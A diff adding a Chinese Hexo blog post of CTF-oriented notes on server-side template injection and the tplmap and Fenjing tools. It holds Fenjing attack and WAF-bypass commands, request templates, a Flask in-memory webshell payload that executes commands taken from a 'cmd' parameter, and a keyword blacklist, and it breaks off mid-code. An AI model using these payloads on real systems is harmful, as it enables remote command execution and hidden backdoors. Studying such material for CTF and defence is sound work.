@@ -1,0 +1,748 @@
+
+
+<!DOCTYPE html>
+<html lang="zh" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FHK_KMD6377">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言首先我们先讲解下什么是模板引擎，为什么需要模板？模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。 模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FHK_KMD终晨">
+<meta property="og:url" content="http://example.com/2024/09/23/%E6%BC%8F%E6%B4%9E-SSTI/index.html">
+<meta property="og:site_name" content="FHK_KMD终晨">
+<meta property="og:description" content="前言首先我们先讲解下什么是模板引擎，为什么需要模板？模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。 模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240918005926.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240918010001.png">
+<meta property="article:published_time" content="2024-09-23T13:13:42.810Z">
+<meta property="article:modified_time" content="2024-09-23T13:13:42.810Z">
+<meta property="article:author" content="FHK_KMD6377">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240918005926.png">
+  
+  
+  
+  <title>FHK_KMD终晨</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Startseite</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archiv</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Kategorien</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Schlagwörter</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>Über</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-23 21:13" pubdate>
+          September 23, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k wörter
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 minuten
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先我们先讲解下什么是模板引擎，为什么需要模板？<br>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
+<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
+<p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>
+<p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>
+<p>正是因为有前端渲染和后端渲染, 所以有时候我们看到返回的数据包是整个的html代码<br><img src="/images/Pasted%20image%2020240918005926.png" srcset="/img/loading.gif" lazyload></p>
+<p>而有时候只有数据<br><img src="/images/Pasted%20image%2020240918010001.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a target="_blank" rel="noopener" href="https://hello-ctf.com/HC_Web/ssti/">SSTI 注入 - Hello CTF (hello-ctf.com)</a></p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="tplmap"><a href="#tplmap" class="headerlink" title="tplmap"></a>tplmap</h3><p><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">epinna&#x2F;tplmap: Server-Side Template Injection and Code Injection Detection and Exploitation Tool (github.com)</a><br>碰到了两个issue<br><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap/issues/104">module ‘collections’ has no attribute ‘Mapping’ · Issue #104 · epinna&#x2F;tplmap (github.com)</a><br><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap/issues/103">‘bool’ object has no attribute ‘replace’ · Issue #103 · epinna&#x2F;tplmap (github.com)</a></p>
+<h3 id="fenjing"><a href="#fenjing" class="headerlink" title="fenjing"></a>fenjing</h3><p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">Marven11&#x2F;Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF (github.com)</a></p>
+<h4 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>他这个可能是python的库和可执行文件结合的一种东西</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"># 首先使用apt/dnf/pip/...安装pipx<br>pip install pipx<br># 然后用pipx自动创建独立的虚拟环境并进行安装<br>pipx install fenjing<br>fenjing webui<br># fenjing scan <span class="hljs-attr">--url</span> &#x27;http://xxxx:xxx<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+<h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p>windows<br>进入<code>C:\Users\lenovo\pipx\venvs\fenjing\Scripts</code><br>启动<code>active</code>激活虚拟环境<br><code>python -m fenjing crack-request --host challenge.basectf.fun --port 42395 --request-file .\req.txt</code><br>req.txt中放数据包, PAYLOAD就是它会攻击的地方</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.basectf.fun:42395<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>19<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://challenge.basectf.fun:42395<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://challenge.basectf.fun:42395/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">flag</span><span class="hljs-operator">=</span>BaseCTF&#123;PAYLOAD&#125;</span><br></code></pre></td></tr></table></figure>
+<h4 id="启动webui"><a href="#启动webui" class="headerlink" title="启动webui"></a>启动webui</h4><p>webui不支持自定义Headers和Cookie等特性，如果需要更灵活的使用方式请直接使用命令行或者作为库调用<br>执行<code>python -m fenjing webui</code>并访问<a target="_blank" rel="noopener" href="http://127.0.0.1:11451/">http://127.0.0.1:11451</a>即可<br>指定host和port：<code>python -m fenjing webui --host &#39;127.0.0.1&#39; --port 1145</code></p>
+<h4 id="作为命令行脚本使用"><a href="#作为命令行脚本使用" class="headerlink" title="作为命令行脚本使用"></a>作为命令行脚本使用</h4><p>扫描网站：<code>python -m fenjing scan --url &#39;http://xxx.xxx/&#39;</code></p>
+<p>攻击对应的表单：</p>
+<ul>
+<li><code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name</code></li>
+<li>也可以指定多个input：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name,email</code></li>
+<li>指定攻击成功后执行的命令<ul>
+<li>不指定则进入交互模式</li>
+<li><code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --exec-cmd &#39;ls /&#39;</code></li>
+</ul>
+</li>
+</ul>
+<p>攻击对应的路径：</p>
+<ul>
+<li><code>python -m fenjing crack-path --url &#39;http://xxx.xxx/hello/&#39;</code></li>
+<li>只需要提供路径的前缀即可</li>
+</ul>
+<p>从文本文件中读取HTTP请求：</p>
+<ul>
+<li><code>python -m fenjing crack-request -f req.txt --host &#39;127.0.0.1&#39; --port 5000</code></li>
+<li>需要提供HTTP请求文件的路径、目标的IP和端口</li>
+</ul>
+<p>通用设置</p>
+<ul>
+<li>指定请求间隔：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --interval 0.1</code></li>
+<li>指定请求时使用的UA：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --user-agent &#39;Aaa/1.1&#39;</code></li>
+<li>指定Header：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --header &#39;Aaa: Bbb&#39; --header &#39;Ccc: Ddd&#39;</code></li>
+<li>指定Cookie：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --cookie &#39;name1=value1; name2=value2&#39;</code></li>
+<li>指定代理：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --proxy &#39;http://127.0.0.1:7890&#39;</code></li>
+<li>指定额外的GET参数：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --extra-params &#39;a=1&amp;b=2&#39;</code></li>
+<li>指定额外的POST参数：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --extra-data &#39;a=1&amp;b=2&#39;</code></li>
+<li>指定分析模式<ul>
+<li><code>--detect-mode</code>：检测模式，可为accurate或fast</li>
+<li>示例：<code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --detect-mode fast</code></li>
+<li>在开始尝试触发WAF, 获取WAF页面对应hash时：<ul>
+<li>accurate模式会一个接一个地发送尽可能多的payload</li>
+<li>fast模式会将多个payload组合在一起发送，</li>
+</ul>
+</li>
+<li>在生成payload时：<ul>
+<li>accurate模式会先从最简单的方法试起</li>
+<li>fast模式会先尝试使用复杂但通常更能绕过WAF的方法</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>指定WAF替换危险关键字时的行为：<ul>
+<li>使用<code>--replaced-keyword-strategy</code>选项</li>
+<li><code>avoid</code>: 避免使用会被WAF替换的关键字</li>
+<li><code>doubletapping</code>: 进行双写（如<code>class</code>变成<code>clclassass</code>）</li>
+<li><code>ignore</code>: 忽略，认为WAF不会对这些关键字做任何事</li>
+<li><code>python -m fenjing crack --url &#39;http://xxx.xxx&#39; --method GET --inputs name --replaced-keyword-strategy doubletapping</code></li>
+</ul>
+</li>
+<li>指定模板渲染环境<ul>
+<li>使用<code>--environment</code>选项</li>
+<li><code>flask</code>: （默认）模板在<code>render_template_string</code>等flask提供的函数中渲染，此时会使用<code>g</code>, <code>config</code>等flask提供的变量生成payload</li>
+<li><code>jinja</code>: 模板使用jinja内置的<code>Template</code>编译并渲染，相关代码类似<code>Template(s).render()</code>，此时避免使用任何普通jinja环境之外提供的变量生成payload</li>
+</ul>
+</li>
+</ul>
+<h5 id="Tamper-Cmd的使用"><a href="#Tamper-Cmd的使用" class="headerlink" title="Tamper Cmd的使用"></a>Tamper Cmd的使用</h5><p>如果指定了<code>--tamper-cmd</code>参数，焚靖在每次提交payload时会使用指定的命令打开一个子进程，向这个子进程的标准输入传入payload, 并将子进程的输出作为编码后的结果进行提交。</p>
+<p>例如：Linux中有一个命令行程序<code>base64</code>，它会从输入中读取内容，进行base64编码并输出</p>
+<p>我们就可以使用<code>--tamper-cmd &#39;base64&#39;</code>指定使用这个命令编码payload</p>
+<p>同样道理，<code>--tamper-cmd &#39;base64|rev&#39;</code>就是先进行base64编码再将内容反转</p>
+<p>也可以使用python来自定义编码方式，例子如下：</p>
+<p>先新建一个<code>encoder.py</code>，写入以下内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-built_in">input</span>()<br><span class="hljs-built_in">print</span>(s[::-<span class="hljs-number">1</span>], end = <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment"># 将payload反转</span><br></code></pre></td></tr></table></figure>
+
+<p>然后指定<code>--tamper-cmd &#39;python encoder.py&#39;</code>就可以了</p>
+<h5 id="crack-request的使用"><a href="#crack-request的使用" class="headerlink" title="crack-request的使用"></a>crack-request的使用</h5><p>crack-request可以实现从文本文件中读取请求并攻击</p>
+<p>例如：使用burp suite拦截了这么一个请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.com:45108<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">flag</span><span class="hljs-operator">=</span><span class="hljs-number">11111</span></span><br></code></pre></td></tr></table></figure>
+
+<p>payload通过POST参数<code>flag</code>提交，我们需要在payload的前面加上一些字符（比如说<code>aaa</code>），从而满足题目要求，通过WAF.</p>
+<p>这里可以打开记事本将请求复制粘贴到<code>req.txt</code>中，然后将<code>flag=11111</code>改成<code>flag=aaaPAYLOAD</code>，这样，fenjing就会在提交请求的时候将<code>PAYLOAD</code>换成实际的payload并提交。</p>
+<p>改好之后<code>req.txt</code>长这样</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.com:45108<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">flag</span><span class="hljs-operator">=</span>aaaPAYLOAD</span><br><span class="language-abnf"></span><br></code></pre></td></tr></table></figure>
+
+<p>写好<code>req.txt</code>之后运行<code>python -m fenjing crack-request --host xxx.com --port 45108 --request-file ./req.txt</code>就可以根据<code>req.txt</code>攻击<code>xxx.com:45108</code>了</p>
+<h4 id="作为库使用"><a href="#作为库使用" class="headerlink" title="作为库使用"></a>作为库使用</h4><h5 id="打内存马"><a href="#打内存马" class="headerlink" title="打内存马"></a>打内存马</h5><p>这里以Flask内存马为例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fenjing<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 这个内存马会获取GET参数cmd并执行，然后在header Aaa中返回</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[</span><br><span class="hljs-string">    app.view_functions</span><br><span class="hljs-string">    for app in [ __import__(&#x27;sys&#x27;).modules[&quot;__main__&quot;].app ]</span><br><span class="hljs-string">    for c4tchm3 in [</span><br><span class="hljs-string">        lambda resp: [</span><br><span class="hljs-string">            resp</span><br><span class="hljs-string">            for cmd_result in [__import__(&#x27;os&#x27;).popen(__import__(&#x27;__main__&#x27;).app.jinja_env.globals[&quot;request&quot;].args.get(&quot;cmd&quot;, &quot;id&quot;)).read()]</span><br><span class="hljs-string">            if [</span><br><span class="hljs-string">                resp.headers.__setitem__(&quot;Aaa&quot;, __import__(&quot;base64&quot;).b64encode(cmd_result.encode()).decode()),</span><br><span class="hljs-string">                print(resp.headers[&quot;Aaa&quot;])</span><br><span class="hljs-string">            ]</span><br><span class="hljs-string">        ][0]</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    if [</span><br><span class="hljs-string">        app.__dict__.update(&#123;&#x27;_got_first_request&#x27;:False&#125;),</span><br><span class="hljs-string">        app.after_request_funcs.setdefault(None, []).append(c4tchm3)</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s<br><br><br>full_payload_gen = fenjing.FullPayloadGen(waf)<br>payload, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.STRING, payload))<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显&quot;</span>)<br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-comment"># 生成payload后在这里打上去</span><br>r = requests.get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span>, params = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: payload<br>&#125;)<br><br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-comment"># 然后使用`?cmd=whoami`就可以在header里看到命令执行结果了</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以这样直接给定表达式而不是给定字符串的值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fenjing<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s<br><br>full_payload_gen = fenjing.FullPayloadGen(waf)<br>payload, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.LITERAL, <span class="hljs-string">&#x27;&quot;1&quot;+&quot;2&quot;&#x27;</span>))<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显&quot;</span>)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
+
+<h5 id="根据WAF函数生成shell指令对应的payload"><a href="#根据WAF函数生成shell指令对应的payload" class="headerlink" title="根据WAF函数生成shell指令对应的payload"></a>根据WAF函数生成shell指令对应的payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload, config_payload<br><span class="hljs-keyword">import</span> logging<br>logging.basicConfig(level = logging.INFO)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span></span>): <span class="hljs-comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span><br>    blacklist = [<br>        <span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;self&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;length&quot;</span>, <span class="hljs-string">&quot;mro&quot;</span>, <span class="hljs-string">&quot;base&quot;</span>, <span class="hljs-string">&quot;lipsum&quot;</span>,<br>        <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;&#123;&#123;&quot;</span>,<br>        <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span 